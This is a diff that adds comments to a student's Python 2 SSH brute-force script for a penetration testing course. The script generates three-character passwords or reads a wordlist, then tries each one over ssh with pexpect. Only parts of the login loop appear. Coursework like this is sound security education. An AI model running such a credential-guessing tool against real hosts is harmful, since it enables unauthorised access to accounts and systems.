@@ -1,11 +1,19 @@
 #!/usr/bin/python2
 
+#Kyle Healy
+#CPSC 62700 - Penetration Testing
+#2/6/2019
+
+# Python function to brute force attempt to access an ssh point for a user and hostname
+
 import pexpect, sys
 
+# Display a usage message and exit
 def usage():
     print "./sshbrute.py <-f filename | -g> <host> <username>"
     sys.exit()
 
+# Reads the command line arguments and set required variables due to flags
 def readCmdLine():
     # Read command line and pull out flags
     gLen = len(sys.argv)
@@ -21,7 +29,8 @@ def readCmdLine():
         usage()
     return (filename, host, user)
 
-
+# Generates all 3 character combination of passwords from the individual characters
+# from the string that is passed in
 def gen3cPass(allCharacters):
     passwords = []
     characters = "".join(set(allCharacters)) #Remove duplicates
@@ -31,6 +40,7 @@ def gen3cPass(allCharacters):
                 passwords.append(c1+c2+c3)
     return passwords
 
+# Reads in a file and creates a list of passwords from each line in the file
 def readPassFromFile(fname):
     passwords=[]
     with open(fname,'r') as f:
@@ -38,6 +48,7 @@ def readPassFromFile(fname):
             passwords.append(line.strip())
     return passwords
 
+# Connect to user@host using pexpect, returning the pexpect process if it worked, or exiting
 def connectToServer(host, user):
     # construct the login string
     connStr = 'ssh ' + user + '@' + host
@@ -56,11 +67,13 @@ def connectToServer(host, user):
 #    print "found password prompt"
     return child
 
+# Attempt the password provided and return the pexpect process
 def attemptPassword(child, password):
 #    print "Sending password {}".format(password)
     child.sendline(password)
     return child
 
+# Attempt logging onto the host as user by trying every password in passwordList
 def trylogin(host, user, passwordList):
    
     child = connectToServer(host,user)
@@ -84,7 +97,7 @@ def trylogin(host, user, passwordList):
             
     print "Failed to find password in list. Exiting"
 
-
+# Main program to run the sshbrute.py code.
 if __name__ == "__main__":
     print "Starting sshbrute.py"
     (fname, host, user) = readCmdLine()
